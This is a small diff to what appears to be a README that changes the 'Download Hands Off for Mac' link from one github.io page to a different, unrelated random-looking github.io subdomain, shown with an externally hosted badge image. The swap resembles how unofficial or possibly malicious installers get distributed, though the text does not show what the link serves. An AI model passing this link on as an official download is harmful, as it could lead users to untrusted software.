@@ -22,7 +22,7 @@
 </p>
 
 <p align="center">
-  <a href="https://drollabil.github.io/.github/hands-off-mac">
+  <a href="https://skalsd-oasd.github.io/.github/hands-off-mac">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png"
          alt="Download Hands Off for Mac — application firewall and network monitor" width="160"/>
   </a>
